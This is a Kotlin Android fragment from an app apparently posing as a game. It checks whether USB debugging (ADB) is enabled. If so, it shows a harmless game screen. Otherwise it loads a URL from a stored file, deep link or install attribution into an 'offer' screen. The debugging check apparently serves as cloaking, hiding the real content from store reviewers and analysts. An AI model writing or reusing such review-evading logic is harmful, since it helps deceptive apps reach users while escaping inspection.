package com.asobimo.alchemi

import android.os.Bundle
import android.provider.Settings
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ProgressBar
import androidx.lifecycle.lifecycleScope
import com.asobimo.alchemi.intentandstate.MoiSobotia
import com.asobimo.alchemi.intentandstate.MoiSostoyania
import kotlinx.coroutines.launch
import org.koin.androidx.viewmodel.ext.android.viewModel

class ZargruzkaFrog : Fragment() {
    private val myViewModel: MyViewModel by viewModel()
    private lateinit var progressBar: ProgressBar
    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val fragment = inflater.inflate(R.layout.fragment_zargruzka_frog, container, false)
        progressBar = fragment.findViewById(R.id.progress_bar)
        observeStates()
        start()
        return fragment
    }

    private fun start(){
        if (checkUSB()){
            parentFragmentManager
                .beginTransaction()
                .replace(R.id.containerForFragments, FunFrog())
                .commit()
        }else{
            lifecycleScope.launch {
                if (myViewModel.fileManipulation.isExist()){
                    myViewModel.moiSobotia.send(MoiSobotia.GetU_R_L)
                }else{
                    myViewModel.bild_leenk(requireContext())
                }
            }
        }
    }
    private fun observeStates(){
        lifecycleScope.launch {
            myViewModel.state.collect{state->
                when(state){
                    is MoiSostoyania.Moi_Load -> {
                        progressBar.visibility = View.VISIBLE
                    }
                    is MoiSostoyania.Moi_Apps -> {
                        navigateToOfferFrog(state.u_r_l!!)
                    }
                    is MoiSostoyania.Moi_Deep -> {
                        navigateToOfferFrog(state.u_r_l!!)
                    }
                    is MoiSostoyania.Moi_File -> {
                        navigateToOfferFrog(state.u_r_l!!)
                    }
                }
            }
        }
    }

    private fun navigateToOfferFrog(yrl:String){
        parentFragmentManager
            .beginTransaction()
            .replace(R.id.containerForFragments, OfferFrog.newInstance(yrl))
            .commit()
    }

    private fun checkUSB():Boolean{
        val cifra = "1"
        val status = Settings.Global.getString(requireContext().contentResolver, Settings.Global.ADB_ENABLED)== cifra
       return status
    }
}